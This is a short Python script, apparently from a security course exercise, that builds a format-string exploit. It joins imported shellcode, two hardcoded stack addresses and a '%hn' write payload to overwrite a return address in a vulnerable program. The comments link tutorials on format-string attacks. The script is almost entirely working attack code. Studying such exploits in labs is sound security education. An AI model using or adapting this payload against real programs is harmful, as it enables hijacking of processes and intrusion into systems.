from shellcode import shellcode
from struct import pack
print shellcode+'\x01'+pack('<I',0xbffea7ea)+pack('<I',0xbffea7ec)+"%40896x%10$hn%8222x%11$hn"

#recitation
#http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
#https://www.jianshu.com/p/f2acfeb66b6c
#https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf
